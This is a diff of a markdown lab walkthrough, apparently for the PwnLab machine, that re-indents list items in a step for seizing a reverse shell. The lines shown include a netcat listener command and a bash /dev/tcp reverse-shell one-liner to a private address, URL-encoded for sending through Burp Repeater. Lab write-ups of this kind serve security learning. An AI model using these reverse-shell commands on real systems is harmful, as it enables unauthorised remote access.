@@ -109,9 +109,9 @@
 1. Seize a reverse shell  
     * Turn on a new terminal  
     * Receive requests with netcat  
-    * `nc -lvnp 1234`  
+        - `nc -lvnp 1234`  
     *  Make an encoded command  
-    * `echo "/bin/bash -c 'bash -i > /dev/tcp/192.168.56.101/1234 0<&1 2>&1'" | php -R 'echo urlencode($argn),"\n";'`  
+        - `echo "/bin/bash -c 'bash -i > /dev/tcp/192.168.56.101/1234 0<&1 2>&1'" | php -R 'echo urlencode($argn),"\n";'`  
     * Send the HTTP request from Burp Repeater with the encoded command  
     ![Burp-HTTP-Request](./img/pwnlab-server17.png)  
     * Seesion is established  
